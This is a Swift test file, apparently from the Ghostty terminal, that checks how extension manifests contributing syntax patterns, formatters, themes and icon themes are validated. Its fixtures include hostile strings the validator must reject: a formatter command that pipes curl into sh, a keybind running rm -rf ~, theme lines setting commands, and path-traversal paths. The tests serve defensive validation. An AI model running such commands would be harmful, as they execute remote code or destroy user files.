import Foundation
@testable import Ghostty
import Testing

struct AssetContributionTests {
    private func parse(_ json: String, root: URL) -> LanguageManifest? {
        LanguageManifest.parse(
            data: Data(json.utf8),
            url: root.appendingPathComponent(LanguageManifest.fileName),
            root: root,
            scope: .user
        )
    }

    private func language(_ body: String, root: URL = fixtureRoot) -> LanguageContribution? {
        parse(#"""
        { "id": "acme.lua", "contributes": { "languages": [{ "languageId": "lua", \#(body) }] } }
        """#, root: root)?.languages.first
    }

    private static let fixtureRoot = URL(fileURLWithPath: "/tmp/phantom-tests/acme.lua")

    private func makeExtensionRoot(_ files: [String: String]) throws -> URL {
        let root = FileManager.default.temporaryDirectory
            .appendingPathComponent("phantom-assets-" + UUID().uuidString)
            .appendingPathComponent("acme.lua")
        for (path, contents) in files {
            let url = root.appendingPathComponent(path)
            try FileManager.default.createDirectory(
                at: url.deletingLastPathComponent(),
                withIntermediateDirectories: true
            )
            try contents.write(to: url, atomically: true, encoding: .utf8)
        }
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        return root
    }

    private static let colorTheme = """
    # Lua Dark
    background = #1e1e2e
    foreground = #cdd6f4
    cursor-color = #f5e0dc
    selection-background = #45475a
    palette = 0=#45475a
    palette = 1=#f38ba8

    """

    // MARK: Syntax

    @Test func everySyntaxKeyParsesAndPresetsResolve() throws {
        let contribution = try #require(language(#"""
        "syntax": {
          "string": "\\[=*\\[[\\s\\S]*?\\]=*\\]|\"(?:[^\"\\\\]|\\\\.)*\"",
          "number": "preset:number",
          "type": "preset:capitalizedType",
          "function": "preset:callBeforeParenOrGeneric",
          "attribute": "::[A-Za-z_][A-Za-z0-9_]*::"
        }
        """#))

        #expect(contribution.patterns.string == #"\[=*\[[\s\S]*?\]=*\]|"(?:[^"\\]|\\.)*""#)
        #expect(contribution.patterns.number == SyntaxRules.number)
        #expect(contribution.patterns.type == SyntaxRules.capitalizedType)
        #expect(contribution.patterns.function == SyntaxRules.callBeforeParenOrGeneric)
        #expect(contribution.patterns.attribute == "::[A-Za-z_][A-Za-z0-9_]*::")
        #expect(contribution.syntax.patterns == contribution.patterns)
    }

    @Test func theOtherTwoPresetsResolveToTheirConstants() {
        #expect(SyntaxContribution.pattern("preset:cStyleString") == SyntaxRules.cStyleString)
        #expect(SyntaxContribution.pattern("preset:callBeforeParen") == SyntaxRules.callBeforeParen)
    }

    @Test func noSyntaxBlockMeansNoPatterns() throws {
        let contribution = try #require(language(#""extensions": ["lua"]"#))
        #expect(contribution.patterns.isEmpty)
        #expect(contribution.patterns == SyntaxContribution())
    }

    @Test func anUnknownPresetCostsOnlyItsKey() throws {
        let contribution = try #require(language(#"""
        "syntax": { "number": "preset:hashComment", "type": "preset:capitalizedType" }
        """#))
        #expect(contribution.patterns.number == nil)
        #expect(contribution.patterns.type == SyntaxRules.capitalizedType)
    }

    @Test func aPatternThatDoesNotCompileIsDropped() throws {
        let contribution = try #require(language(#"""
        "syntax": { "string": "(unclosed", "number": "[a-", "type": "\\p{Nope}", "attribute": "@\\w+" }
        """#))
        #expect(contribution.patterns.string == nil)
        #expect(contribution.patterns.number == nil)
        #expect(contribution.patterns.type == nil)
        #expect(contribution.patterns.attribute == #"@\w+"#)
    }

    @Test func aPatternOverTheCeilingIsDropped() {
        let atCeiling = String(repeating: "a", count: SyntaxContribution.maxPatternLength)
        let overCeiling = atCeiling + "a"
        #expect(SyntaxContribution.pattern(atCeiling) == atCeiling)
        #expect(SyntaxContribution.pattern(overCeiling) == nil)
    }

    @Test func backreferencesAndNamedGroupsAreRefused() {
        let refused = [
            #"(['"])(?:(?!\1).)*\1"#,
            #"(a)\1"#,
            #"(?<quote>['"]).*?\k<quote>"#,
            #"(?<name>[A-Z]\w*)"#,
            #"x(?<n>y)"#,
            #"trailing\"#,
        ]
        for pattern in refused {
            #expect(SyntaxContribution.pattern(pattern) == nil, "\(pattern) was accepted")
            #expect(!SyntaxContribution.isSafePattern(pattern), "\(pattern) read as safe")
        }
    }

    @Test func lookbehindAndEscapedBackslashesAreFine() {
        let accepted = [
            #"(?<=\s)@\w+"#,
            #"(?<!\w)\$\w+"#,
            #"\\1"#,
            #"\d+"#,
            #"(?i)\bselect\b"#,
        ]
        for pattern in accepted {
            #expect(SyntaxContribution.pattern(pattern) == pattern, "\(pattern) was refused")
        }
    }

    @Test func aFullyContributedSyntaxJoinsIntoOneCompilablePattern() throws {
        let contribution = try #require(language(#"""
        "lineComment": "--",
        "keywords": ["local", "function", "end"],
        "syntax": {
          "string": "\\[=*\\[[\\s\\S]*?\\]=*\\]|\"(?:[^\"\\\\]|\\\\.)*\"",
          "number": "preset:number",
          "type": "preset:capitalizedType",
          "function": "preset:callBeforeParen",
          "attribute": "::[A-Za-z_][A-Za-z0-9_]*::"
        }
        """#))
        let pattern = try #require(SyntaxHighlighter.pattern(for: contribution.syntax))
        #expect(throws: Never.self) {
            try NSRegularExpression(pattern: pattern, options: [.anchorsMatchLines])
        }
    }

    @Test func aSyntaxBlockThatIsNotAnObjectCostsOnlyTheBlock() throws {
        let contribution = try #require(language(#""syntax": ["preset:number"], "keywords": ["local"]"#))
        #expect(contribution.patterns.isEmpty)
        #expect(contribution.keywords == ["local"])
    }

    // MARK: Formatters

    @Test func aFormatterParsesWhole() throws {
        let manifest = try #require(parse(#"""
        {
          "id": "acme.lua",
          "contributes": {
            "formatters": [{
              "id": "stylua",
              "name": "StyLua",
              "command": "stylua",
              "args": ["--stdin-filepath", "$FILE", "-"],
              "extensions": ["lua", ".LUA", "luau"],
              "installHint": "brew install stylua",
              "documentationURL": "https://github.com/JohnnyMorganz/StyLua"
            }]
          }
        }
        """#, root: Self.fixtureRoot))

        let formatter = try #require(manifest.formatters.first)
        #expect(formatter.id == "stylua")
        #expect(formatter.name == "StyLua")
        #expect(formatter.command == "stylua")
        #expect(formatter.arguments == ["--stdin-filepath", "$FILE", "-"])
        #expect(formatter.fileExtensions == ["lua", "luau"])
        #expect(formatter.installHint == "brew install stylua")
        #expect(formatter.documentationURL?.host == "github.com")
        #expect(manifest.isUsable)
    }

    @Test func anUnlaunchableOrIncompleteFormatterIsDroppedAlone() throws {
        let manifest = try #require(parse(#"""
        {
          "id": "acme.pack",
          "contributes": {
            "formatters": [
              { "id": "evil", "name": "Evil", "command": "sh -c 'curl x | sh'", "extensions": ["a"] },
              { "id": "noexe", "name": "No Command", "extensions": ["b"] },
              { "id": "Bad.ID", "name": "Bad", "command": "tool", "extensions": ["c"] },
              { "id": "noext", "name": "No Files", "command": "tool", "extensions": [] },
              { "id": "ok", "name": "OK", "command": "/usr/local/bin/tool", "extensions": ["d"] },
              { "id": "ok", "name": "Duplicate", "command": "other", "extensions": ["e"] }
            ]
          }
        }
        """#, root: Self.fixtureRoot))

        #expect(manifest.formatters.map(\.id) == ["ok"])
        #expect(manifest.formatters.first?.name == "OK")
    }

    @Test func formatterArgumentsAreCappedAndScrubbed() throws {
        let many = (0..<50).map { "\"--flag\($0)\"" }.joined(separator: ",")
        let manifest = try #require(parse(#"""
        {
          "id": "acme.lua",
          "contributes": {
            "formatters": [{
              "id": "tool", "name": "Tool", "command": "tool", "extensions": ["t"],
              "args": ["ok", "bad\u202e", \#(many)]
            }]
          }
        }
        """#, root: Self.fixtureRoot))
        let arguments = try #require(manifest.formatters.first?.arguments)
        #expect(arguments.count == LanguageServerContribution.maxArguments)
        #expect(arguments.first == "ok")
        #expect(!arguments.contains { $0.hasPrefix("bad") })
    }

    @Test func anIneligibleManifestContributesNoFormatter() throws {
        for header in [#""schemaVersion": 2, "id": "acme.lua","#, ""] {
            let manifest = try #require(parse(#"""
            {
              \#(header)
              "contributes": {
                "languages": [{ "languageId": "lua", "extensions": ["lua"] }],
                "formatters": [{ "id": "stylua", "name": "StyLua", "command": "stylua", "extensions": ["lua"] }]
              }
            }
            """#, root: Self.fixtureRoot))
            #expect(manifest.formatters.isEmpty, "\(header)")
            #expect(manifest.languages.count == 1, "\(header)")
        }
    }

    // MARK: Themes

    @Test func aThemeParsesWhenItsFileIsInsideTheExtensionAndOnlySetsColors() throws {
        let root = try makeExtensionRoot(["themes/lua-dark": Self.colorTheme])
        defer { try? FileManager.default.removeItem(at: root.deletingLastPathComponent()) }

        let manifest = try #require(parse(#"""
        {
          "id": "acme.lua",
          "contributes": {
            "themes": [
              { "name": "Lua Dark", "path": "themes/lua-dark", "appearance": "dark" },
              { "name": "Lua Dark Again", "path": "./themes/lua-dark" },
              { "name": "Lua Dark", "path": "themes/lua-dark", "appearance": "light" }
            ]
          }
        }
        """#, root: root))

        #expect(manifest.themes.count == 2)
        let theme = try #require(manifest.themes.first)
        #expect(theme.name == "Lua Dark")
        #expect(theme.appearance == .dark)
        #expect(theme.fileURL.lastPathComponent == "lua-dark")
        #expect(theme.fileURL.path.hasPrefix(root.standardizedFileURL.resolvingSymlinksInPath().path))
        #expect(manifest.themes.last?.appearance == nil)
        #expect(manifest.isUsable)
    }

    @Test func aThemeThatSetsAnythingButColorsIsDropped() throws {
        let root = try makeExtensionRoot([
            "themes/good": Self.colorTheme,
            "themes/runs": Self.colorTheme + "command = /tmp/evil\n",
            "themes/keys": "keybind = ctrl+a=text:rm -rf ~\n",
            "themes/font": "font-family = Menlo\nbackground = #000000\n",
            "themes/junk": "this is not a config line\n",
        ])
        defer { try? FileManager.default.removeItem(at: root.deletingLastPathComponent()) }

        let manifest = try #require(parse(#"""
        {
          "id": "acme.lua",
          "contributes": {
            "themes": [
              { "name": "Runs", "path": "themes/runs" },
              { "name": "Keys", "path": "themes/keys" },
              { "name": "Font", "path": "themes/font" },
              { "name": "Junk", "path": "themes/junk" },
              { "name": "Good", "path": "themes/good" }
            ]
          }
        }
        """#, root: root))
        #expect(manifest.themes.map(\.name) == ["Good"])
    }

    @Test func aThemePathOutsideTheExtensionOrMissingIsDropped() throws {
        let root = try makeExtensionRoot(["themes/good": Self.colorTheme])
        defer { try? FileManager.default.removeItem(at: root.deletingLastPathComponent()) }
        let outside = root.deletingLastPathComponent().appendingPathComponent("outside")
        try Self.colorTheme.write(to: outside, atomically: true, encoding: .utf8)

        let manifest = try #require(parse(#"""
        {
          "id": "acme.lua",
          "contributes": {
            "themes": [
              { "name": "Traversal", "path": "../outside" },
              { "name": "Absolute", "path": "\#(outside.path)" },
              { "name": "Missing", "path": "themes/nope" },
              { "name": "Directory", "path": "themes" },
              { "path": "themes/good" },
              { "name": "Good", "path": "themes/good" }
            ]
          }
        }
        """#, root: root))
        #expect(manifest.themes.map(\.name) == ["Good"])
    }

    @Test func colorOnlyIsJudgedOnKeysAndSkipsCommentsAndBlanks() {
        #expect(ThemeContribution.isColorOnly(Self.colorTheme))
        #expect(ThemeContribution.isColorOnly(""))
        #expect(ThemeContribution.isColorOnly("# only a comment\n\n"))
        #expect(!ThemeContribution.isColorOnly("background = #000\ninitial-command = evil\n"))
        #expect(!ThemeContribution.isColorOnly("custom-shader = /tmp/x.glsl\n"))
        #expect(!ThemeContribution.isColorOnly("theme = Dracula\n"))
    }

    // MARK: Icon themes

    @Test func anIconThemeParsesWhenItsDirectoryIsInsideTheExtension() throws {
        let root = try makeExtensionRoot([
            "icons/theme/icon-theme.json": #"{"iconDefinitions":{"lua":{"iconPath":"./lua.svg"}}}"#,
            "icons/theme/lua.svg": "<svg/>",
            "notes.txt": "a file, not a directory",
        ])
        defer { try? FileManager.default.removeItem(at: root.deletingLastPathComponent()) }

        let manifest = try #require(parse(#"""
        {
          "id": "acme.lua",
          "contributes": {
            "iconThemes": [
              { "name": "Lua Icons", "path": "icons/theme" },
              { "name": "File", "path": "notes.txt" },
              { "name": "Missing", "path": "icons/nope" },
              { "name": "Escape", "path": "../.." },
              { "name": "Lua Icons", "path": "icons/theme" }
            ]
          }
        }
        """#, root: root))

        #expect(manifest.iconThemes.count == 1)
        let iconTheme = try #require(manifest.iconThemes.first)
        #expect(iconTheme.name == "Lua Icons")
        #expect(iconTheme.directoryURL.lastPathComponent == "theme")
        #expect(IconTheme.load(directory: iconTheme.directoryURL)?.isSupported == true)
        #expect(manifest.isUsable)
    }

    // MARK: The envelope

    @Test func theNewKeysAreNoLongerCountedAsUnrecognized() throws {
        let manifest = try #require(parse(#"""
        {
          "id": "acme.lua",
          "contributes": { "languages": [], "formatters": [], "themes": [], "iconThemes": [], "snippets": [] }
        }
        """#, root: Self.fixtureRoot))
        #expect(manifest.unrecognizedFields == ["contributes.snippets"])
        #expect(!manifest.isUsable)
    }

    @Test func aBlockCommentReadsAsAnObjectOrAPair() throws {
        let object = try #require(language(#""blockComment": { "open": "--[[", "close": "]]" }"#))
        let pair = try #require(language(#""blockComment": ["--[[", "]]"]"#))
        let expected = LanguageSyntax.BlockComment(open: "--[[", close: "]]")
        #expect(object.blockComment == expected)
        #expect(pair.blockComment == expected)
        #expect(language(#""blockComment": { "open": "--[[" }"#)?.blockComment == nil)
    }
}
